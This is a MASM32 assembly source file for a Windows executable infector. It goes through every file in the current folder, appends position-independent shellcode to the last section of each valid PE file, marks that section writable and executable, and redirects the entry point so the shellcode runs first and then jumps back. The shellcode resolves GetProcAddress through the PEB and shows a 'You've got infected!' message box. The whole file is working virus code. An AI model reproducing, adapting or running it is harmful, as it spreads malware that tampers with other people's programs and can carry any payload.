.386 
.model flat,stdcall 
option casemap:none 
include \masm32\include\windows.inc 
include \masm32\include\kernel32.inc 
includelib \masm32\lib\kernel32.lib 
include \masm32\include\user32.inc 
includelib \masm32\lib\user32.lib 

WinMain proto :DWORD,:DWORD,:DWORD,:DWORD 
Injectcode proto :DWORD

SEH struct 
PrevLink dd ?           
CurrentHandler dd ?   
SafeOffset dd ?       
PrevEsp dd ?      
PrevEbp dd ?      
SEH ends

.data
FileNamePattern db "*.*",0
template db "é",0
temp db "%s",0 
AppName db "Inject code",0
stt db "DONE!",0 
wp db "0x00",0

.data?
hInstance HINSTANCE ? 
buffer db 512 dup(?) 
hFile dd ? 
hMapping dd ? 
pMapping dd ?
ValidPE dd ? 
numsec dd ?
filesize dd ?
newEOP dd ?
RVAnewEOP dd ?
sw dd ?
lenshell dd ? 
jmp_shell dd ?
endShell dd ?

.code 
start:
	invoke GetModuleHandle, NULL 
  	mov hInstance,eax 
  	invoke WinMain, hInstance,NULL, NULL, SW_SHOWDEFAULT 
  	invoke ExitProcess,eax 
	
WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD 
	LOCAL finddata:WIN32_FIND_DATA 
	LOCAL FHandle:DWORD 
  	invoke FindFirstFile,addr FileNamePattern,addr finddata 
  	.if eax!=INVALID_HANDLE_VALUE 
    	mov FHandle,eax 
    	.while eax!=0
      		test finddata.dwFileAttributes,FILE_ATTRIBUTE_DIRECTORY 
      		.if ZERO?
      			;invoke MessageBox, NULL, addr finddata.cFileName, NULL, MB_OK
      			invoke Injectcode, addr finddata.cFileName
      		.endif 
      		invoke FindNextFile,FHandle,addr finddata 
    	.endw 
    	invoke FindClose,FHandle 
  	.endif
  	invoke MessageBox, 0, addr stt, addr AppName, MB_OK
  	ret 
WinMain endp

Injectcode proc uses edi filename:DWORD
	LOCAL seh:SEH
	LOCAL num:DWORD
	;invoke MessageBox, NULL, filename, NULL, MB_OK
	jmp END_ADD
START_ADD:
	assume fs: nothing
	xor ecx,ecx
	mov eax,fs:[ecx+30h]
	mov eax,dword ptr [eax+0ch]
	mov esi,dword ptr [eax+14h]
	lodsd
	xchg esi,eax
	lodsd
	mov ecx,dword ptr [eax+10h]
	xor ebx,ebx
	mov ebx,dword ptr [ecx+3ch]
	add ebx,ecx
	mov ebx,dword ptr [ebx+78h]
	add ebx,ecx
	mov esi,dword ptr [ebx+20h]
	add esi,ecx
	xor edx,edx
	g:
	inc edx
	lodsd
	add eax,ecx
	cmp dword ptr [eax],50746547h
	jnz g
	cmp dword ptr [eax+4],41636f72h
	jnz g
	cmp dword ptr [eax+8],65726464h
	jnz g
	mov esi,dword ptr [ebx+1ch]
	add esi,ecx
	mov edx,[esi+edx*4]
	add edx,ecx
	mov esi,edx
	mov edi,ecx
	xor ebx,ebx
	push ebx
	push 41797261h
	push 7262694ch
	push 64616f4ch
	push esp
	push ecx
	call edx
	add esp,16
	xor ecx,ecx
	push 42426c6ch
	mov [esp+2],cl
	push 642e3233h
	push 72657375h
	push esp
	call eax
	add esp,12
	xor ecx,ecx
	push 4241786fh
	mov [esp+3],cl
	push 42656761h
	push 7373654dh
	push esp
	push eax
	call esi
	add esp,12
	xor edx,edx
	xor ecx,ecx
	push edx
	push 4f464e49h
	lea edx,[esp]
	push ecx
	push 21646574h       
	push 6365666eh       
	push 6920746fh       
	push 67206576h       
	push 27756f59h
	lea ecx,[esp]
	xor ebx,ebx
	push ebx
	push edx
	push ecx
	xor ebx,ebx
	push ebx
	call eax
	popa
END_ADD: 
    invoke CreateFile, filename, GENERIC_READ or GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
    .if eax!=INVALID_HANDLE_VALUE 
       	mov hFile, eax
       	invoke GetFileSize, hFile, NULL
       	mov filesize,eax
       	add eax,100h 
       	invoke CreateFileMapping, hFile, NULL, PAGE_READWRITE,0,eax,0 
       	.if eax!=NULL 
          	mov hMapping, eax
          	mov eax,filesize
          	add eax,100h 
          	invoke MapViewOfFile,hMapping,FILE_MAP_WRITE or FILE_MAP_READ,0,0,eax
          	.if eax!=NULL 
             	mov pMapping,eax 
             	assume fs:nothing 
            	push fs:[0] 
            	pop seh.PrevLink 
             	mov seh.CurrentHandler,offset SEHHandler 
             	mov seh.SafeOffset,offset FinalExit 
             	lea eax,seh 
           		mov fs:[0], eax 
             	mov seh.PrevEsp,esp 
             	mov seh.PrevEbp,ebp 
             	mov edi, pMapping 
             	assume edi:ptr IMAGE_DOS_HEADER 
             	.if [edi].e_magic==IMAGE_DOS_SIGNATURE 
                	add edi, [edi].e_lfanew 
                	assume edi:ptr IMAGE_NT_HEADERS 
                	.if [edi].Signature==IMAGE_NT_SIGNATURE 
                   		mov ValidPE, TRUE 
                	.else 
                   		mov ValidPE, FALSE 
                	.endif 
             	.else 
                 	mov ValidPE,FALSE 
             	.endif 
FinalExit: 
            	.if ValidPE==TRUE
            		mov ax,[edi].FileHeader.NumberOfSections
                   	movzx eax,ax
                   	dec eax
                   	mov numsec,eax
                   	mov esi,edi
                   	add esi, sizeof IMAGE_NT_HEADERS
                   	mov eax, sizeof IMAGE_SECTION_HEADER
                   	mov ebx,numsec
                   	mul ebx
                   	add esi,eax
                   	assume esi:ptr IMAGE_SECTION_HEADER
                   	mov eax,[esi].PointerToRawData
                   	add eax,[esi].SizeOfRawData
                   	mov newEOP,eax
                   	mov sw,eax
                   	sub eax,[esi].PointerToRawData
                   	add eax,[esi].VirtualAddress
                   	mov RVAnewEOP,eax
                   	mov eax,[esi].SizeOfRawData
                   	add eax,100h
                   	mov [esi].SizeOfRawData,eax
                   	mov [esi].Misc.VirtualSize,eax
                   	mov [esi].Characteristics,0E0000060h
                   	mov eax,[esi].VirtualAddress
                   	add eax,[esi].Misc.VirtualSize
                   	mov [edi].OptionalHeader.SizeOfImage,eax
                   	invoke SetFilePointer,hFile,sw,0,0
                   	invoke WriteFile,hFile,addr wp,100h,addr num,NULL
                   	invoke SetFilePointer,hFile,newEOP,0,0
                   	invoke WriteFile,hFile,offset START_ADD,offset END_ADD - offset START_ADD,addr num,NULL
                   	mov eax,offset END_ADD
                   	sub eax,offset START_ADD
                   	mov lenshell,eax
                   	add eax,newEOP
                   	mov endShell,eax
                   	invoke SetFilePointer,hFile,eax,0,0
                   	invoke WriteFile,hFile,addr template,1,addr num,NULL
                   	mov eax,endShell
                   	inc eax
                   	invoke SetFilePointer,hFile,eax,0,0
                   	mov eax,[edi].OptionalHeader.AddressOfEntryPoint
                   	sub eax,RVAnewEOP
                   	sub eax,lenshell
                   	sub eax,5
                   	mov jmp_shell,eax
                   	invoke WriteFile,hFile,addr jmp_shell,4,addr num,NULL
                   	mov eax,RVAnewEOP
                   	mov [edi].OptionalHeader.AddressOfEntryPoint,eax
                   	invoke FlushViewOfFile,pMapping,0
  					;invoke MessageBox, 0, addr stt, addr AppName, MB_OK
             	.else 
  					ret 
             	.endif 
             	push seh.PrevLink 
             	pop fs:[0] 
             	invoke UnmapViewOfFile, pMapping 
          	.else 
  				ret
          	.endif 
          	invoke CloseHandle,hMapping 
       	.else 
 			ret
       	.endif 
       	invoke CloseHandle, hFile 
    .else 
       	ret
    .endif 
	ret
Injectcode endp

SEHHandler proc C uses edx pExcept:DWORD, pFrame:DWORD, pContext:DWORD, pDispatch:DWORD 
    mov edx,pFrame 
    assume edx:ptr SEH 
    mov eax,pContext 
    assume eax:ptr CONTEXT 
    push [edx].SafeOffset 
    pop [eax].regEip 
    push [edx].PrevEsp 
    pop [eax].regEsp 
    push [edx].PrevEbp 
    pop [eax].regEbp 
    mov ValidPE, FALSE 
    mov eax,ExceptionContinueExecution 
    ret 
SEHHandler endp 

end start